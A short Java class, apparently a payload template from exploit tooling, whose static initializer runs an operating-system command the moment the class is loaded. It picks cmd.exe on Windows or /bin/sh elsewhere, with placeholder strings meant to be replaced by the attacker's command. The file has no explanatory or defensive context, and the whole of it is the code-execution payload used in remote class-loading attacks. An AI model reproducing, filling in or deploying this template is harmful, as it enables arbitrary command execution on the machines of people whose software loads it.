public class BuildCmd {
  public BuildCmd() {}
  static {
    try {
      String[] w_cmd = {"cmd.exe","/c", "WWWWW"};
      String[] l_cmd = {"/bin/sh","-c", "LLLLL"};
      if(System.getProperty("os.name").toLowerCase().contains("win")){
        if(w_cmd[2].length() > 0){
          java.lang.Runtime.getRuntime().exec(w_cmd).waitFor();
        }
      }else{
        if(l_cmd[2].length() > 0){
          java.lang.Runtime.getRuntime().exec(l_cmd).waitFor();
        }
      }
    }catch (Exception e){
      e.printStackTrace();
    }
  }
  public static void main(String[] args) {
    BuildCmd b = new BuildCmd();
  }
}
